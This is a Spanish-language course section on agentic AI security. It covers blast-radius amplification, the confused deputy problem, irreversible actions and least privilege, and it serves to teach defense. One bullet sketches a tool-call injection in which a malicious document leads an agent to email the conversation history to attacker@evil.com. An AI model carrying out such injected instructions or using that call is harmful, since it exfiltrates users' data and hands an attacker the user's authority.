# Módulo 9 – Capítulo 05 – Sección 03

## Seguridad agéntica: un agente con herramientas amplifica el impacto de un ataque

Hay un umbral cualitativo entre un sistema de chat puro y un sistema agéntico que tiene consecuencias de seguridad fundamentales. Cuando un LLM solo genera texto como output, el peor caso de un jailbreak exitoso es texto malicioso: instrucciones peligrosas, contenido inapropiado, o información que no debería haberse generado. Cuando ese mismo LLM tiene herramientas —puede ejecutar código, llamar APIs externas, leer y escribir archivos, enviar emails, hacer reservas, confirmar transacciones— el peor caso de un jailbreak exitoso es cualquier combinación de esas acciones, ejecutadas con las credenciales y permisos del usuario legítimo, en sistemas reales con consecuencias irreversibles. Este salto en el impacto potencial es lo que hace a la seguridad agéntica una disciplina específica que merece tratamiento independiente.

Los frameworks agénticos que permiten este salto cualitativo son exactamente los que el AI Engineer moderno usa en producción: LangChain Agents con toolkits de herramientas predefinidas, LangGraph con flujos de trabajo stateful, CrewAI con múltiples agentes colaborando en roles especializados, y las plataformas propietarias como Anthropic Computer Use que dan al LLM control directo sobre un navegador y un sistema operativo. Cada uno de estos frameworks amplifica dramáticamente el impacto de cualquier vulnerabilidad de seguridad que ya existía en el LLM subyacente, porque convierte esas vulnerabilidades de "el modelo dice algo malo" a "el modelo hace algo malo".

El principio que articula este riesgo con mayor claridad es la amplificación del blast radius. En un sistema de chat, el blast radius de un ataque exitoso es la sesión del usuario atacado: el atacante obtiene respuestas no autorizadas pero no puede hacer nada en el mundo externo. En un agente con herramientas de escritura en base de datos, envío de emails y ejecución de código, el blast radius de un ataque exitoso puede ser la base de datos de clientes modificada, cientos de emails enviados en nombre del usuario, o código malicioso ejecutado en el servidor. El principio de diseño que emerge de esta observación es el de la inversión de la confianza proporcional al impacto: las herramientas con mayor impacto potencial requieren controles de autorización más estrictos, no más permisivos.

El confused deputy problem, descrito por Norm Hardy en 1988 en el contexto de sistemas operativos, aplica directamente a los agentes: el agente actúa en nombre del usuario (con sus credenciales, permisos y contexto) pero puede ser manipulado por un atacante (via prompt injection) para usar esas credenciales para acciones que el usuario no autorizó. El agente es el "deputy" confundido entre dos principals con intenciones opuestas: el usuario legítimo que le delegó autoridad para ejecutar tareas, y el atacante que inyectó instrucciones para redirigir esa autoridad hacia sus propios fines. La solución no es eliminar la delegación de autoridad —es el fundamento del diseño agéntico— sino implementar controles en el plano de acción que verifiquen que cada acción ejecutada es coherente con la intención del usuario legítimo, no con instrucciones adversariales inyectadas.

## Aspectos técnicos

- **Amplificación del blast radius:** el impacto de cualquier ataque exitoso en un sistema agéntico escala con el poder de las herramientas disponibles; herramientas de ejecución de código, modificación de bases de datos o envío de comunicaciones convierten un jailbreak en una acción real en sistemas externos.
- **Tool call injection:** un ataque de prompt injection que resulta en una llamada a una herramienta con argumentos controlados por el atacante; por ejemplo, instruir al agente a llamar `send_email(to="attacker@evil.com", body=conversation_history)` a través de un documento malicioso en el contexto.
- **Confused deputy problem:** el agente actúa con las credenciales y permisos del usuario legítimo, pero puede ser manipulado por el atacante para usar esos permisos para acciones no autorizadas; la solución es el plano de control que valida la coherencia de cada acción con la intención del usuario.
- **Irreversibilidad de acciones agénticas:** las acciones de un agente pueden ser irreversibles (borrar un archivo, enviar un email, confirmar una transacción financiera); el diseño debe distinguir entre acciones reversibles (que el agente puede ejecutar directamente) y acciones irreversibles (que requieren confirmación explícita del usuario antes de ejecutarse).
- **Blast radius limitado por diseño:** aplicar mínimo privilegio a cada herramienta significa que el agente tiene el acceso más restrictivo posible que le permita cumplir su función legítima; un agente con acceso limitado tiene un blast radius limitado incluso si es completamente comprometido.

La seguridad de un sistema agéntico es inversamente proporcional al blast radius de sus herramientas: cuanto más poderosas y de mayor impacto irreversible sean las acciones disponibles, más rigurosos deben ser los controles de autorización, el sandboxing de ejecución y los mecanismos de confirmación humana antes de ejecutar acciones críticas.
